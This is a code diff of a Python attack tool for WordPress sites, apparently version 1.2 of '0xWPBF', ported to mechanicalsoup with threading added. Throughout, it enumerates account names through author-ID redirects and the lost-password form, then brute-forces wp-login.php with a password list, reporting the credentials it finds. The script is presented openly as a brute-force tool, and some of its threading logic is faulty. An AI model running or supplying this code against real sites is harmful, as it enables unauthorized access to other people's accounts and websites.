@@ -1,151 +1,190 @@
 #!/usr/bin/python
-#coding: utf-8
-
-import requests
-from lxml.html import fromstring
-from requests.exceptions import ConnectionError
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-from progressbar import ProgressBar
-pbar = ProgressBar()
+# coding: utf-8
+from __future__ import print_function
+import itertools
+import threading
+import time
 import sys, os, argparse
-reload(sys)
-sys.setdefaultencoding('utf-8')
+import mechanicalsoup
 
-print ''' \033[1;33m
-                █▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀
-                █▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER
-                █▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░ v1.2
-                Coded By Abdullah AlZahrani | Site: www.0xa.tech
-                Twitter: @0xAbdullah | GitHub.com/0xAbdullah\033[1;m\n'''
+print('''
+    \033[1;33m█▀▀█ █░█  █░░░█    █▀▀█     █▀▀▄     █▀▀\033[1;m
+    \033[1;31m█▄▀█ ▄▀▄  █▄█▄█ord █░░█ress █▀▀▄RUTE █▀▀ORCER\033[1;m
+    \033[1;33m█▄▄█ ▀░▀  ░▀░▀░    █▀▀▀     ▀▀▀░     ▀░░ v1.2
+    Coded By Abdullah AlZahrani | Website: www.0xa.tech
+    Twitter: @0xAbdullah | GitHub.com/0xAbdullah\033[1;m
+    ''')
 
-parser = argparse.ArgumentParser(description="Wordpress users enumerate and brute force attack")
-parser.add_argument( '-s', required=True, default=None, help='target domain or URL.    [Example] python 0xwpbf.py -s http://example.com')
-parser.add_argument( '-p', required=False, default=None , help='Path of the password file.    [Example] python 0xwpbf.py -s http://example.com -p password.txt')
-parser.add_argument( '-u', required=False, default=None , help='target username.    [Example] python 0xwpbf.py -s http://example.com -u Admin -p password.txt')
-parser.add_argument( '-e', required=False, default=None , help='Guess usernames.    [Example] python 0xwpbf.py -s http://example.com -e username.txt')
+parser = argparse.ArgumentParser(description="\033[1;33m[--]\033[1;m Wordpress users enumerate and brute force attack")
+parser.add_argument('-s', required=False, default=None, help='Target Website.')
+parser.add_argument('-p', required=False, default=None, help='Password list / Path of password file.')
+parser.add_argument('-u', required=False, default=None, help='Target username.')
+parser.add_argument('-e', required=False, default=None, help='Guess usernames / Path of usernames file.')
+parser.add_argument('-t', required=False, default=None, help='Number of threads.')
+
 args = vars(parser.parse_args())
 
 if len(sys.argv) == 1:
-        print '[!] Usage: python WPBF.py -h'
-        sys.exit(1)
+    print("[\033[1;33m--\033[1;m] Usage: python 0xwpbf.py -h")
+    sys.exit()
 
-
-UserName = args['u']
-PasswordFile = args['p']
-FileUsernames = args['e']
 host = args['s']
 if not host.startswith("http"):
-    sys.exit("\033[1;33m[!]\033[1;m Wrong Site formate (ex): http://%s" % (host))
+    sys.exit("[\033[1;33m--\033[1;m] Wrong Site formate (ex): http://{}".format(host))
 
-headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
-'Content-Type': 'application/x-www-form-urlencoded'}
+browser = mechanicalsoup.StatefulBrowser(
+    soup_config={'features': 'lxml'},
+    raise_on_404=True,
+    user_agent='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2228.0 Safari/537.36', )
 
-def auto_users():
-    if args['u'] is None:
-        print "\033[1;33m[+]\033[1;m Searching for username..."
-        ID = 1
-        Found = 0
-        CheckUser = (host+'/?author=')
-        for i in CheckUser:
+if args['t'] is not None:
+    numThreads = int(args['t'])
+else:
+    numThreads = int(1)
+
+def info():
+    browser.open(host)
+    page = browser.get_current_page()
+    print("[\033[1;33m--\033[1;m] Website: {} ".format(host))
+    print("[\033[1;33m--\033[1;m] Title: {}\n".format(page.title.text.encode('utf-8')))
+
+
+info()
+
+
+def _bruteForce():
+    done = False
+    print('\r[\033[1;33m--\033[1;m] To stop press Ctrl + Z')
+    print('\r[\033[1;33m--\033[1;m] Number of thread/s: {}'.format(numThreads))
+    def animate():  # animation function
+        for c in itertools.cycle(['|', '/', '-', '\\']):
+            if done:
+                sys.stdout.flush()
+                print('\r[\033[1;33m--\033[1;m] Done !                                ')
+                sys.stdout.flush()
+                sys.exit()
+
+
+            sys.stdout.write('\r[\033[1;33m--\033[1;m] Starting the password Brute Forcer [{}]                 '.format(c))
+            sys.stdout.flush()
+            time.sleep(0.1)
+
+    if os.path.exists(args['p']) == False:
+        print("[\033[1;41m--\033[1;m] Password File Path Does Not exist !")
+        sys.exit()
+    pwdFile = open(args['p'], 'r')
+
+    def bruteForce():  # thread Brute Force function
+        for password in pwdFile:
             try:
-                TestUser = (CheckUser+str(ID))
-                r = requests.get(TestUser, headers=headers)
-                if r.status_code == 200:
-                    pass
-                else:
-                    break
-                r = requests.get(CheckUser+str(ID), headers=headers)
-                tree = fromstring(r.content)
-                user = tree.findtext('.//title')
-                User, sep, tail = user.partition(' ')
-                print "\033[1;32m[#]\033[1;m ID: %s Username: \033[1;32m%s\033[1;m" % (ID, User)
-                Found = 1
-                ID = ID+1
+                browser.open(host + '/wp-login.php')
+                browser.select_form('#loginform')
+                browser["log"] = args['u']
+                browser["pwd"] = password
+                browser.submit_selected()
+                page = browser.get_current_page()
+                wpLogin = page.find("div", class_="wp-menu-name")
+                if wpLogin:
+                    print("\n[\033[1;32m--\033[1;m] Password Found"
+                          "\n[\033[1;32m--\033[1;m] WP-login: {}/wp-admin"
+                          "\n[\033[1;32m--\033[1;m] Username: {}"
+                          "\n[\033[1;32m--\033[1;m] Password: {}"
+                          .format(host, args['u'], password))
+            except mechanicalsoup.utils.LinkNotFoundError:
+                sys.stdout.flush()
+                sys.stdout.write('\r[\033[1;33m--\033[1;m] website may be down Or you have been banned!          ')
             except KeyboardInterrupt:
-                break
+                print('sdsd')
             except:
                 pass
-        if Found == 0:
-            print "\033[1;33m[!]\033[1;m User Not Found !"
+
+    loading = threading.Thread(target=animate)
+    threads = []
+
+    for i in range(numThreads):
+        threadBruteForce = threading.Thread(target=bruteForce)
+        threadBruteForce.start()
+        threads.append(threadBruteForce)
+
+    loading.start()
+    threadBruteForce.join()
+    done = True
 
 
-def BF():
-    if os.path.exists(args['p']) == False:
-        print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
-        sys.exit()
-    Password = open(PasswordFile, 'r').readlines()
-    Target = (host+"/wp-login.php")
-    print '''
-[#] Website: %s
-[#] Username: %s''' % (host, UserName)
-    Found = 0
-    for line in pbar(Password):
-        password = line.strip()
+def autoEnumeration():
+    checkUser = (host + "/?author=")
+    found = 0
+    ID = 1
+    print("[\033[1;33m--\033[1;m] Searching for active username/s automatically!")
+    for i in checkUser:
         try:
-            http = requests.post(Target, data={'log':UserName, 'pwd':password, 'wp-submit':'submit' }, verify=False, timeout=5, headers=headers)
-            content = http.content
-            if "Dashboard" in content:
-                print "\n\n[+] Password Found!"
-                print "[+] Dashboard: %s\n[+] Username: %s\n[+] Password: \033[1;42m%s\033[1;m \n[*] Check output.txt File !" % (Target, UserName, password)
-                Foundpass = "[~] Target: %s\n[@] User: %s\n[$] Password: %s\n\n" % (Target, UserName, password)
-                file = open("output.txt", "a")
-                file.write(Foundpass)
-                file.close()
-                Found = 1
+            check = (checkUser + str(ID))
+            res = browser.open(check)
+            user = res.url.rsplit('/', 0)[-1]
+            user = user.rsplit('/', 1)
+            user = ''.join(user)
+            user = user.rsplit('/', 1)[1]
+            usernameList = []
+            if "author" in user:
+                if found:
+                    break
+                print("[\033[1;41m--\033[1;m] There is a problem, the URL can not be traced")
+                break
+            print("[\033[1;32m--\033[1;m] username: {}".format(user))
+            found = True
+            ID = 1 + ID
+            if user in usernameList:
+                break
+            usernameList.append(user)
+        except mechanicalsoup.utils.LinkNotFoundError:
+            if found == 1:
                 break
             else:
-                pass
-        except ConnectionError:
-            pass
-	except Exception:
-            pass
-        except requests.exceptions.Timeout:
-            pass
+                print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
+                break
         except KeyboardInterrupt:
-            print "\n\n\033[1;33m[!]\033[1;m User requested An Interrupt"
-            sys.exit()
-    if Found == 0:
-        print "\n\033[1;33m[-]\033[1;m Password Not Found !"
-    else:
-        pass
+            sys.exit('[--] EXIT...')
 
 
-def Guess_usernames():
+def manualEnumeration():
     if os.path.exists(args['e']) == False:
-        print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
-    UserName = open(FileUsernames, 'r').readlines()
-    Target = (host+"/wp-login.php?action=lostpassword")
-    print "\033[1;33m[+]\033[1;m Searching for username..."
-    Checker = 'error-page'
-    Found = 0
-    for line in UserName:
-        UserName = line.strip()
+        print("[\033[1;41m--\033[1;m] Usernames File Path Does Not exist !")
+        sys.exit()
+    userFile = open(args['e'], "r")
+    found = False
+    print("[\033[1;33m--\033[1;m] Searching for username/s!")
+    for user in userFile:
+        user = user.split()
         try:
-            http = requests.post(Target, data={'user_login':UserName, 'wp-submit':'submit' }, verify=False, timeout=5, headers=headers)
-            content = http.content
-            if "loginform" in content:
-                print "\033[1;32m[#]\033[1;m Username: \033[1;32m%s\033[1;m" % UserName
-                Found = 1
-            elif " mail() " in content:
-                print "\033[1;32m[#]\033[1;m Username: \033[1;32m%s\033[1;m" % UserName
-                Found = 1
-            else:
+            browser.open(host + "/wp-login.php?action=lostpassword")
+            browser.select_form('#lostpasswordform')
+            browser["user_login"] = user
+            browser.submit_selected()
+            page = browser.get_current_page()
+            lostPassword = page.find("div", id="login_error")
+            if lostPassword:
                 pass
-        except ConnectionError:
-            pass
-        except requests.exceptions.Timeout:
-            pass
+            else:
+                print("[\033[1;32m--\033[1;m] username: {}".format(user[0]))
+                found = True
         except KeyboardInterrupt:
-            print "\n\n\033[1;33m[!]\033[1;m User requested An Interrupt"
+            sys.exit('[--] EXIT...')
+        except:
+            print("[\033[1;41m--\033[1;m] There may be a firewall does not allow to extract username/s!")
             sys.exit()
-    if Found == 0:
-        print "\033[1;33m[!]\033[1;m User Not Found !"
-if args['s'] is not None and args['e'] is not None:
-    Guess_usernames()
-elif args['s'] is not None and args['u'] is None:
-    auto_users()
-elif args['s'] is not None and args['u'] is not None and args['p'] is not None:
-    BF()
-else:
-    print "\033[1;33m[!]\033[1;m Input is not correct, check them out! Or typing python 0xwpbf.py -h"
+
+    if found == False:
+        print("[\033[1;41m--\033[1;m] Not found usernames!")
+
+def main():
+    if args['s'] is not None and args['e'] is not None:
+        manualEnumeration()
+    elif args['s'] is not None and args['u'] is None:
+        autoEnumeration()
+    elif args['s'] is not None and args['u'] is not None and args['p'] is not None:
+        _bruteForce()
+    else:
+        print("\033[1;33m[!]\033[1;m Input is not correct, check them out! Or typing python 0xwpbf.py -h")
+
+if __name__ == '__main__':
+    main()
